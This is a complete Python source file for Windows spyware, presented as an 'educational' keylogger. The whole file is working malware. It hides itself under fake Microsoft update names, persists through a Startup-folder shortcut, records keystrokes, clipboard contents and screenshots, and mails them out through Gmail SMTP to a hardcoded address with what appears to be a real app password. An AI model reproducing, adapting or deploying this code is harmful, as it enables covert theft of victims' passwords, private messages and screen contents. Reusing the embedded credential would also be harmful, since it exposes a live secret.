
# Advanced Keylogger with Full Persistence, Stealth, and Gmail Exfiltration (Educational Use Only)
import os
import sys
import shutil
import logging
import time
import threading
import smtplib
import pyperclip
from email.message import EmailMessage
from PIL import ImageGrab
import pynput.keyboard
import win32com.client

# === CONFIGURATION ===
ATTACKER_EMAIL = "seriesmytest@gmail.com"
APP_PASSWORD = "uccsmprzvhjkewzh"
SEND_INTERVAL = 120  # 5 minutes

# === STEALTH & PERSISTENCE SETUP ===
def setup_persistence():
    appdata_dir = os.getenv('APPDATA')
    stealth_dir = os.path.join(appdata_dir, "MicrosoftLogs")
    target_exe = os.path.join(stealth_dir, "winupdater.exe")
    current_exe = sys.executable

    if not current_exe.lower().startswith(stealth_dir.lower()):
        try:
            if not os.path.exists(stealth_dir):
                os.makedirs(stealth_dir)
            shutil.copy2(current_exe, target_exe)

            startup_folder = os.path.join(appdata_dir, r"Microsoft\Windows\Start Menu\Programs\Startup")
            shortcut_path = os.path.join(startup_folder, "WindowsUpdater.lnk")

            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortcut(shortcut_path)
            shortcut.TargetPath = target_exe
            shortcut.WorkingDirectory = stealth_dir
            shortcut.IconLocation = target_exe
            shortcut.save()

            os.startfile(target_exe)
            sys.exit()
        except Exception as e:
            print("[-] Persistence setup failed:", e)

setup_persistence()

# === SETUP LOGGING ===
appdata_path = os.getenv('APPDATA')
log_dir = os.path.join(appdata_path, "MicrosoftLogs")
if not os.path.exists(log_dir):
    os.makedirs(log_dir)
os.chdir(log_dir)
log_file = os.path.join(log_dir, "keylog.txt")
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# === 1. KEYLOGGER ===
def on_press(key):
    try:
        logging.info("Key: " + str(key))
    except Exception as e:
        logging.error("Key logging error: " + str(e))

# === 2. CLIPBOARD MONITOR ===
def clipboard_monitor():
    last_clip = ""
    while True:
        try:
            current_clip = pyperclip.paste()
            if current_clip != last_clip:
                logging.info("Clipboard: " + current_clip)
                last_clip = current_clip
        except Exception as e:
            logging.warning("Clipboard error: " + str(e))
        time.sleep(30)

# === 3. SCREENSHOT CAPTURE ===
def screenshot_capture():
    while True:
        try:
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            img = ImageGrab.grab()
            img_path = os.path.join(log_dir, f"screenshot_{timestamp}.png")
            img.save(img_path)
            logging.info(f"Screenshot saved: {img_path}")
        except Exception as e:
            logging.warning("Screenshot error: " + str(e))
        time.sleep(60)

# === 4. EMAIL EXFILTRATION ===
import mimetypes

def send_email():
    try:
        msg = EmailMessage()
        msg["Subject"] = "Keylog + Screenshots"
        msg["From"] = ATTACKER_EMAIL
        msg["To"] = ATTACKER_EMAIL
        msg.set_content("Attached: keylog and screenshots.")

        # Attach the keylog file
        with open(log_file, "rb") as f:
            msg.add_attachment(
                f.read(),
                maintype="text",
                subtype="plain",
                filename="keylog.txt"
            )

        # Attach up to 3 screenshots
        count = 0
        for filename in os.listdir(log_dir):
            if filename.endswith(".png") and count < 3:
                filepath = os.path.join(log_dir, filename)
                mime_type, _ = mimetypes.guess_type(filepath)
                if mime_type:
                    maintype, subtype = mime_type.split("/")
                else:
                    maintype, subtype = "application", "octet-stream"

                with open(filepath, "rb") as img:
                    msg.add_attachment(
                        img.read(),
                        maintype=maintype,
                        subtype=subtype,
                        filename=filename
                    )
                count += 1

        # Send the email
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(ATTACKER_EMAIL, APP_PASSWORD)
            smtp.send_message(msg)
            logging.info("Email with screenshots sent.")

    except Exception as e:
        logging.error(f"Email send failed: {e}")



# === 5. EMAIL SENDER LOOP ===
def periodic_email_sender():
    while True:
        send_email()
        time.sleep(SEND_INTERVAL)

# === START THREADS ===
threading.Thread(target=clipboard_monitor, daemon=True).start()
threading.Thread(target=screenshot_capture, daemon=True).start()
threading.Thread(target=periodic_email_sender, daemon=True).start()

# === START KEYLOGGER ===
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
